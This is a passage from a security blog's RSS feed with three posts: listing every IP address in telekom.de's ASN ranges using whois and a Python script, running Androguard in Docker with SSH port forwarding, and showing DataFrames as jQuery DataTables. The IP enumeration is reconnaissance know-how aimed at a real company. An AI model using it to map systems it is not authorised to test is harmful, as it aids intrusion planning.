      <content:encoded><![CDATA[<p>Sometimes you need to know if a certain IP (or several ones) are within an IP range or belong to a certain <a href="http://en.wikipedia.org/wiki/Autonomous_System_%28Internet%29">ASN</a>. Let&rsquo;s give it a try and generate all possible IP addresses for <a href="http://telekom.de">telekom.de</a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ dig telekom.de 
...
telekom.de.     <span style="color:#3677a9">86346</span>   IN  A   46.29.100.76
...
</code></pre></div><p>Now let&rsquo;s find out the ASN:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ whois 46.29.100.76 | grep origin            
origin:         AS34086
</code></pre></div><p>Now ask <a href="http://ripe.net">RIPE</a> for the IP ranges:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ whois -h whois.ripe.net -T route AS34086 -i origin | egrep <span style="color:#ed9d13">&#34;route: &#34;</span> | awk <span style="color:#ed9d13">&#39;{print $NF}&#39;</span>   
145.225.1.0/24
151.136.0.0/16
185.9.216.0/22
193.143.55.0/24
193.143.56.0/24
193.143.57.0/24
217.150.144.0/20
217.150.144.0/21
46.29.96.0/21
93.188.240.0/21
94.100.240.0/20
</code></pre></div><p>Now for every IP range let&rsquo;s generate all <em>possible</em> IP addresses. Therefore I&rsquo;ve wrote a simple python script.</p>
<blockquote>
<p>I know there is <a href="www.cpan.org/authors/id/R/RA/RAYNERLUC/cidr2range-0.9.pl">cidr2range</a> but that didn&rsquo;t work for certain blocks like <strong>145.225.1.0/24</strong>.</p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat cidr2list.py 
<span style="color:#999;font-style:italic">#!/usr/bin/env python2</span>

import sys
from netaddr import IPNetwork

<span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#40ffff">__name__</span> == <span style="color:#ed9d13">&#34;__main__&#34;</span>:
    <span style="color:#6ab825;font-weight:bold">if</span> len(sys.argv) != 2:
        print <span style="color:#ed9d13">&#34;Usage: %s &lt;CIDR Block&gt;\n&#34;</span> % sys.argv[0]
    <span style="color:#6ab825;font-weight:bold">else</span>:
        <span style="color:#6ab825;font-weight:bold">for</span> ip in IPNetwork(sys.argv[1]):
            print <span style="color:#ed9d13">&#39;%s&#39;</span> % ip
</code></pre></div><p>Now let&rsquo;s generate the lists:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ whois -h whois.ripe.net -T route AS34086 -i origin | egrep <span style="color:#ed9d13">&#34;route: &#34;</span> | awk <span style="color:#ed9d13">&#39;{print $NF}&#39;</span>  &gt;&gt; /tmp/ip-ranges.txt
$ cat /tmp/ip-ranges.txt | xargs -n1 ./cidr2list.py &gt; /tmp/ip-lists.txt
$  head -n <span style="color:#3677a9">10</span> /tmp/ip-lists.txt 
145.225.1.0
145.225.1.1
145.225.1.2
145.225.1.3
145.225.1.4
145.225.1.5
145.225.1.6
145.225.1.7
145.225.1.8
145.225.1.9
$ wc -l /tmp/ip-lists.txt 
<span style="color:#3677a9">81920</span> /tmp/ip-lists.txt
</code></pre></div><p>Voila! :)</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Androguard with Docker</title>
      <link>https://blog.dornea.nu/2014/09/12/howto-androguard-with-docker/</link>
      <pubDate>Fri, 12 Sep 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/09/12/howto-androguard-with-docker/</guid>
      <content:encoded><![CDATA[<p>Meanwhile I think I&rsquo;ve felt in love with <em>Androguard</em>. I love its Pythonic way handling things and its visualizations features. As many of you have noticed, you can run Androguard inside a <em>Docker</em> container. I&rsquo;ve never used Docker before so it was about time. You can find some general information about the installation process on Arch Linux at <a href="https://docs.docker.com/installation/archlinux/">this</a> address.</p>
<h3 id="extensions">Extensions</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Install extensions
# &lt;!-- collapse=True --&gt;
%install_ext https://raw.githubusercontent.com/dorneanu/ipython/master/extensions/diagmagic.py
    
# Then load extensions
%load_ext diagmagic
</code></pre></div><pre><code>Installed diagmagic.py. To use it, type:
  %load_ext diagmagic
The diagmagic extension is already loaded. To reload it, use:
  %reload_ext diagmagic
</code></pre>
<p>On my main pentest machine (kudoz to @blackarch) I&rsquo;ve installed docker and followed these instructions. Here is my service file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!cat /etc/systemd/system/docker.service
</code></pre></div><pre><code>.include /usr/lib/systemd/system/docker.service
[Service]
# assume 192.168.1.1 is your proxy server, don't use 127.0.0.1
#Environment=&quot;http_proxy=192.168.1.1:3128&quot;
ExecStart=
ExecStart=/usr/bin/docker -d -g /home/cyneox/work/docker
</code></pre>
<p>I&rsquo;ve added myself to the <em>docker</em> group in order to be able to start docker as a regular user:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># sudo gpasswd -a cyneox docker</span>
</code></pre></div><p>Afterwards make sure you enable the service:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># sudo systemctl enable docker</span>
</code></pre></div><p>Now make sure you do a reboot (Windows style :D).</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
<span style="color:#999;font-style:italic"># Check if docker is running</span>
sudo systemctl start docker
ps -ax | grep docker
</code></pre></div><pre><code>  836 ?        Ssl    0:00 /usr/bin/docker -d -g /home/cyneox/work/docker
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!docker info
</code></pre></div><pre><code>Containers: 0
Images: 0
Storage Driver: devicemapper
 Pool Name: docker-8:1-385640-pool
 Pool Blocksize: 64 Kb
 Data file: /home/cyneox/work/docker/devicemapper/devicemapper/data
 Metadata file: /home/cyneox/work/docker/devicemapper/devicemapper/metadata
 Data Space Used: 291.5 Mb
 Data Space Total: 102400.0 Mb
 Metadata Space Used: 0.7 Mb
 Metadata Space Total: 2048.0 Mb
Execution Driver: native-0.2
Kernel Version: 3.16.1-1-ARCH
Operating System: Arch Linux
WARNING: No swap limit support
</code></pre>
<h2 id="install-androguard">Install Androguard</h2>
<p>I could find 3 maintained dockerized Android images:</p>
<ol>
<li><a href="https://github.com/adepasquale/docker-androguard">https://github.com/adepasquale/docker-androguard</a></li>
<li><a href="https://github.com/dweinstein/dockerfile-androguard">https://github.com/dweinstein/dockerfile-androguard</a></li>
<li><a href="https://github.com/aikinci/androguard">https://github.com/aikinci/androguard</a></li>
</ol>
<p>The <a href="https://github.com/dweinstein/dockerfile-androguard">2nd</a> one started automatically <em>androguard</em> so you couldn&rsquo;t tweak the underlying system. So I&rsquo;ve decided to look at <a href="https://github.com/aikinci">@aikinci</a>&rsquo;s androguard docker container.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!docker run -it -v ~/samples/:/root/samples/ honeynet/androguard 
</code></pre></div><pre><code>Unable to find image 'honeynet/androguard' locally
Pulling repository honeynet/androguard

[1B
[0B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[1B
[36B]0;root@de3fbe90bdde: ~root@de3fbe90bdde:~# ^C
]0;root@de3fbe90bdde: ~root@de3fbe90bdde:~# 
]0;root@de3fbe90bdde: ~root@de3fbe90bdde:~# 
</code></pre>
<p>It must say that was pretty <strong>fast</strong>. And <strong>easy</strong> to do! In the end you&rsquo;ll get a root bash prompt. Since the image does not provide all the tools I need, you&rsquo;ll have to install them manually. After you have <code>exit</code>ed from the container you can attach it again. But first lets see which container are currently active:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!docker ps -a
</code></pre></div><pre><code>CONTAINER ID        IMAGE                        COMMAND             CREATED             STATUS              PORTS               NAMES
de3fbe90bdde        honeynet/androguard:latest   &quot;/bin/bash&quot;         5 minutes ago       Up 5 minutes                            sleepy_lalande      
</code></pre>
<p>Now you can re-attach to a specific container by using <code>docker attach</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># docker attach de3fbe90bdde</span>
root@de3fbe90bdde:~# 
</code></pre></div><p>Now I&rsquo;ve installed some additional packages:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@de3fbe90bdde:~# apt-get install openssh-server ipython ipython-notebook vim
...
</code></pre></div><p>Now change the <code>root</code> password:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@de3fbe90bdde:~# passwd
...
</code></pre></div><p>Start SSH server:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@de3fbe90bdde:~# /etc/init.d/sshd start
...
</code></pre></div><p>Now <strong>most important</strong>: You&rsquo;ll have to <strong>commit</strong> your change to the image otherwise all changes will be lost on next start. On the maching running docker run:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># docker commit de3fbe90bdde</span>
</code></pre></div><h2 id="network-with-docker">Network with docker</h2>
<p>When started docker creates a new virtual interface on the <strong>host</strong> machine called <code>docker0</code> (<a href="https://docs.docker.com/articles/networking/">more</a>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!ifconfig docker0
</code></pre></div><pre><code>docker0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500
        inet 172.17.42.1  netmask 255.255.0.0  broadcast 0.0.0.0
        inet6 fe80::bd01:3011:3b12:b866  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether 56:84:7a:fe:97:99  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre>
<p>As you can see docker choosed a subnet and assigned an IP address to that interface. What about the <strong>guest</strong> machine?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@de3fbe90bdde:~# ifconfig -a
eth0      Link encap:Ethernet  HWaddr 02:5b:c7:1e:a8:26  
          inet addr:172.17.0.2  Bcast:0.0.0.0  Mask:255.255.0.0
          inet6 addr: fe80::5b:c7ff:fe1e:a826/64 Scope:Link
          UP BROADCAST RUNNING  MTU:1500  Metric:1
          RX packets:2225 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1949 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:17216525 (17.2 MB)  TX bytes:134553 (134.5 KB)
</code></pre></div><p>Can I reach the container within the host machine?</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!ping -c 4 172.17.0.2
</code></pre></div><pre><code>PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.086 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.118 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.131 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.099 ms

--- 172.17.0.2 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 2997ms
rtt min/avg/max/mdev = 0.086/0.108/0.131/0.020 ms
</code></pre>
<p>Looks good! Well before I go to the next steps let me show my current pentest setup.</p>
<h2 id="pentest-setup">Pentest setup</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">%%blockdiag
// &lt;!-- collapse=True --&gt;
blockdiag admin {
    // A and B belong to first group.
    group first_group {
        label = &#34;&#34;;
        color = &#34;#FFF&#34;;
        Arch[label = &#34;Arch Linux Host&#34;];
        group kvm_group {
            label = &#34;KVM/QEMU&#34;;
            textcolor = &#34;#FF0000&#34;;
            color = &#34;#EFEFEF&#34;;
    

            KaliLinux[label = &#34;Kali Linux&#34;];
            Windows[label = &#34;Windows Pentest&#34;];
            shape = line;
            style = dashed;
            
            group blackarch {
                label = &#34;&#34;;
                textcolor = &#34;#FF0000&#34;;
                color = &#34;#EFEFEF&#34;;
                BlackArch[label = &#34;BlackArch Host&#34;];
    
               group docker {
                  // Set group-label
                  label = &#34;&#34;;

                  // Set background-color to this group.
                  color = &#34;#77FF77&#34;;

                  // Set textcolor to this group
                  textcolor = &#34;#FF0000&#34;;
                  shape = line;

                  Docker;
                  Docker -&gt; Androguard;
                  Docker -&gt; Container1;
                  Docker -&gt; ContainerX;
               }
            }
        }
    }

   // E, F and G belong to second group.


   Arch -&gt; BlackArch;
   Arch -&gt; KaliLinux;
   Arch -&gt; Windows;
   BlackArch -&gt; Docker;
    
}
</code></pre></div><p><img src="/posts/img/2014/howto-androguard-with-docker/output_23_0.png" alt="png"></p>
<p>On my physical machine (<code>Arch Linux Host</code>) I run several <code>QEMU</code> instances:</p>
<ul>
<li>Kali Linux (Pentest)</li>
<li>Windows (Pentest)</li>
<li>BlackArch (Pentest)</li>
</ul>
<h2 id="a-little-bit-of-networking">A little bit of networking</h2>
<p><strong>Inside</strong> <code>BlackArch</code> I run docker which manages several containers. Regarding the networking part this is what I want to achieve:</p>
<ol>
<li>Be able to access <code>Androguard</code> from <code>Arch Linux Host</code></li>
<li>Be able to access <code>Androguard</code> from <code>BlackArch Host</code></li>
<li>Be able to access the <em>Internet</em> from <code>Androguard</code></li>
</ol>
<p>The first one is the most important to me, since I want to access the Androguard container <strong>directly</strong> - preferably through SSH. Since the Ã€ndroguard machine gets a private IP address, it&rsquo;s obvious I can&rsquo;t access it - yet. The packets must be routed though <code>BlackArch Host</code>. Let&rsquo;s check IPv4 forwarding:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!sysctl net.ipv4.conf.all.forwarding
</code></pre></div><pre><code>net.ipv4.conf.all.forwarding = 1
</code></pre>
<p>Ok for now. The Docker <a href="https://docs.docker.com/articles/networking/">documentation</a> states:</p>
<blockquote>
<p>By default Docker containers can make connections to the outside world, but the outside world cannot connect to containers. Each outgoing connection will appear to originate from one of the host machine&rsquo;s own IP addresses thanks to an iptables masquerading rule on the host machine that the Docker server creates when it starts</p>
</blockquote>
<p>After starting the Androguard container, let&rsquo;s check the firewall rules:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!sudo iptables -t nat -L
</code></pre></div><pre><code>Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
DOCKER     all  --  anywhere             anywhere             ADDRTYPE match dst-type LOCAL

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
DOCKER     all  --  anywhere            !127.0.0.0/8          ADDRTYPE match dst-type LOCAL

Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination         
MASQUERADE  all  --  localhost/16         anywhere            

Chain DOCKER (2 references)
target     prot opt source               destination         
</code></pre>
<p>Having a futher look at the documentaton, I&rsquo;ve found this:</p>
<blockquote>
<p>More convenient is the -p SPEC or &ndash;publish=SPEC option which lets you be explicit about exactly which external port on the Docker server â€” which can be any port at all, not just those in the 49000â€“49900 block â€” you want mapped to which port in the container.</p>
</blockquote>
<p>Now, let&rsquo;s stop the container and restart it again with the <code>-p</code> paramater:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!docker ps -a
</code></pre></div><pre><code>CONTAINER ID        IMAGE                        COMMAND             CREATED             STATUS                     PORTS               NAMES
534dc09cc451        honeynet/androguard:latest   &quot;/bin/bash&quot;         14 seconds ago      Exited (0) 8 seconds ago                       sleepy_mcclintock   
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">%%bash
docker stop 534dc09cc451
docker rm 534dc09cc451
</code></pre></div><pre><code>534dc09cc451
534dc09cc451
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!docker ps -a
</code></pre></div><pre><code>CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
</code></pre>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!docker run -t -i -p 22 honeynet/androguard 
</code></pre></div><pre><code>]0;root@469eced649c1: ~root@469eced649c1:~# ^C
]0;root@469eced649c1: ~root@469eced649c1:~# 
]0;root@469eced649c1: ~root@469eced649c1:~# 
</code></pre>
<p>Now let&rsquo;s check iptables again:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">!sudo iptables -t nat -L
</code></pre></div><pre><code>Chain PREROUTING (policy ACCEPT)
target     prot opt source               destination         
DOCKER     all  --  anywhere             anywhere             ADDRTYPE match dst-type LOCAL

Chain INPUT (policy ACCEPT)
target     prot opt source               destination         

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination         
DOCKER     all  --  anywhere            !127.0.0.0/8          ADDRTYPE match dst-type LOCAL

Chain POSTROUTING (policy ACCEPT)
target     prot opt source               destination         
MASQUERADE  all  --  localhost/16         anywhere            

Chain DOCKER (2 references)
target     prot opt source               destination         
DNAT       tcp  --  anywhere             anywhere             tcp dpt:49154 to:172.17.0.4:22
</code></pre>
<p>As you can see in the last line all packets sent to <strong>localhost:49154</strong> (which is <code>BlackArch Host</code>) will be forwarded to <strong>172.17.0.4:22</strong>. Bingo! On <code>Arch Linux Host</code> I try to reach <code>Androguard</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># telnet blackarch.local 49154</span>
Trying 10.0.1.92...
Connected to blackarch.local.
Escape character is <span style="color:#ed9d13">&#39;^]&#39;</span>.
SSH-2.0-OpenSSH_6.6.1p1 Ubuntu-2ubuntu2
^C^C
Connection closed by foreign host.
</code></pre></div><p>Perfect!</p>
<h2 id="accessing-ipython-on-androguard">Accessing IPython on Androguard</h2>
<p>Now you could use port forwarding to access services on <code>Androguard</code> through the SSH tunnel. On the <code>Androguard</code> machine I usually start <code>ipython-notebook</code> to take notes etc. I usually run it as:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">root@469eced649c1:~/ipython# ipython notebook --no-browser --port <span style="color:#3677a9">7000</span>
2014-09-11 16:48:11.330 [NotebookApp] Created profile dir: u<span style="color:#ed9d13">&#39;/root/.ipython/profile_default&#39;</span>
2014-09-11 16:48:11.336 [NotebookApp] Using system MathJax
2014-09-11 16:48:11.350 [NotebookApp] Serving notebooks from <span style="color:#24909d">local</span> directory: /root/ipython
2014-09-11 16:48:11.350 [NotebookApp] The IPython Notebook is running at: http://127.0.0.1:7000/
2014-09-11 16:48:11.350 [NotebookApp] Use Control-C to stop this server and shut down all kernels (twice to skip confirmation).
...
</code></pre></div><p>On <code>ArchLinux Host</code> I run:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#999;font-style:italic"># ssh -L localhost:7777:localhost:7000 root@blackarch.local -p 49154</span>
root@blackarch.local<span style="color:#a61717;background-color:#e3d2d2">&#39;</span>s password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.2.0-37-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms <span style="color:#6ab825;font-weight:bold">for</span> each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@469eced649c1:~# 
</code></pre></div><p>As you can see I&rsquo;ve successfully logged in into the <code>Androguard</code> machine through <code>BlackArch Host</code> using <a href="http://en.wikipedia.org/wiki/Network_address_translation#DNAT">DNAT</a>. On <code>ArchLinux Host</code> I can open the browser and point to <code>http://localhost:7777</code> which connects to <code>IPython</code> on the <code>Androguard</code> machine.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Using JQuery DataTables with IPython</title>
      <link>https://blog.dornea.nu/2014/08/28/using-jquery-datatables-with-ipython/</link>
      <pubDate>Thu, 28 Aug 2014 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2014/08/28/using-jquery-datatables-with-ipython/</guid>
      <content:encoded><![CDATA[<p>I thought this might be interesting enough to share with you. Every time I&rsquo;m working with DataFrames I somehow miss the search feature: I&rsquo;d like to search for certain patterns inside the columns and rows. I used to use <a href="https://datatables.net">JQuery DataTables</a> for <a href="http://dornea.nu/projects/netgrafio">netgrafio</a>. But I couldn&rsquo;t find any simple way to integrate it with IPython. Well it was easier than I thought.</p>
<h2 id="extensions">Extensions</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
from IPython import display
from IPython.core.magic import register_cell_magic, Magics, magics_class, cell_magic
import jinja2

# Create jinja cell magic (http://nbviewer.ipython.org/urls/gist.github.com/bj0/5343292/raw/23a0845ee874827e3635edb0bf5701710a537bfc/jinja2.ipynb)
@magics_class
class JinjaMagics(Magics):
    &#39;&#39;&#39;Magics class containing the jinja2 magic and state&#39;&#39;&#39;
    
    def __init__(self, shell):
        super(JinjaMagics, self).__init__(shell)
        
        # create a jinja2 environment to use for rendering
        # this can be modified for desired effects (ie: using different variable syntax)
        self.env = jinja2.Environment(loader=jinja2.FileSystemLoader(&#39;.&#39;))
        
        # possible output types
        self.display_functions = dict(html=display.HTML, 
                                      latex=display.Latex,
                                      json=display.JSON,
                                      pretty=display.Pretty,
                                      display=display.display)

    
    @cell_magic
    def jinja(self, line, cell):
        &#39;&#39;&#39;
        jinja2 cell magic function.  Contents of cell are rendered by jinja2, and 
        the line can be used to specify output type.

        ie: &#34;%%jinja html&#34; will return the rendered cell wrapped in an HTML object.
        &#39;&#39;&#39;
        f = self.display_functions.get(line.lower().strip(), display.display)
        
        tmp = self.env.from_string(cell)
        rend = tmp.render(dict((k,v) for (k,v) in self.shell.user_ns.items() 
                                        if not k.startswith(&#39;_&#39;) and k not in self.shell.user_ns_hidden))
        
        return f(rend)
        
    
ip = get_ipython()
ip.register_magics(JinjaMagics)
</code></pre></div><h2 id="datatable-function">DataTable function</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># &lt;!-- collapse=True --&gt;
import uuid

def DataTable(df):
    &#34;&#34;&#34; Prints a pandas.DataFrame as JQuery DataTables &#34;&#34;&#34;
    from IPython.display import HTML
    # Generate random container name
    id_container = uuid.uuid1()
    output = &#34;&#34;&#34;
        &lt;div id=&#34;datatable-container-%s&#34;&gt;
            &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/css/jquery.dataTables.css&#34;&gt;
            &lt;link rel=&#34;stylesheet&#34; type=&#34;text/css&#34; href=&#34;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/css/jquery.dataTables_themeroller.css&#34;&gt;
            &lt;script type=&#34;text/javascript&#34; charset=&#34;utf8&#34; src=&#34;http://ajax.aspnetcdn.com/ajax/jquery.dataTables/1.9.0/jquery.dataTables.min.js&#34;&gt;&lt;/script&gt;

            &lt;script type=&#34;text/javascript&#34;&gt;
                var url = window.location.href;
                
                if(url.indexOf(&#34;localhost:9999&#34;) != -1){
                    $(&#39;#datatable-container-%s table.datatable&#39;).dataTable();
                } else {
                    $.getScript(&#34;http://code.jquery.com/jquery-1.11.1.min.js&#34;);
                    $(document).ready(function() {
                        $(&#39;#datatable-container-%s table.datatable&#39;).dataTable();
                    });
                }
                
            &lt;/script&gt;
            &lt;!-- Insert table below --&gt;
            %s
        &lt;/div&gt;
    &#34;&#34;&#34; % (id_container, id_container, id_container, df.to_html(index=False, classes=&#34;datatable dataframe&#34;))
    return HTML(output)
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">
</code></pre></div><p>I know the code is not perfect, but at least it works for me. Now let&rsquo;s create some random DataFrame:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">import pandas as pd
import urllib2
from yurl import URL


# Fetch list of random URLs (found using Google)
response = urllib2.urlopen(&#39;http://files.ianonavy.com/urls.txt&#39;)
targets_row = response.read()

# Create DataFrame
targets = pd.DataFrame([t for t in targets_row.splitlines()], columns=[&#34;Target&#34;])

# Join root domain + suffix
extract_root_domain =  lambda x: &#39;.&#39;.join(tldextract.extract(x)[1:3])

target_columns = [&#39;scheme&#39;, &#39;userinfo&#39;, &#39;host&#39;, &#39;port&#39;, &#39;path&#39;, &#39;query&#39;, &#39;fragment&#39;, &#39;decoded&#39;]
target_component = [list(URL(t)) for t in targets[&#39;Target&#39;]]

# Create data frame
df_targets = pd.DataFrame(target_component, columns=target_columns)
</code></pre></div><h3 id="classic-html-output">Classic HTML output</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">df_targets[:20]
</code></pre></div><div style="max-height:1000px;max-width:1500px;overflow:auto;">
<table border="1" class="dataframe">
  <thead>
    <tr style="text-align: right;">
      <th></th>
      <th>scheme</th>
      <th>userinfo</th>
      <th>host</th>
      <th>port</th>
      <th>path</th>
      <th>query</th>
      <th>fragment</th>
      <th>decoded</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th>0 </th>
      <td> http</td>
      <td> </td>
      <td>               www.altpress.org</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>1 </th>
      <td> http</td>
      <td> </td>
      <td>           www.nzfortress.co.nz</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>2 </th>
      <td> http</td>
      <td> </td>
      <td>         www.evillasforsale.com</td>
      <td> </td>
      <td>                   </td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>3 </th>
      <td> http</td>
      <td> </td>
      <td>           www.playingenemy.com</td>
      <td> </td>
      <td>                  /</td>
      <td> </td>
      <td> </td>
      <td> False</td>
    </tr>
    <tr>
      <th>4 </th>
      <td> http</td>
      <td> </td>
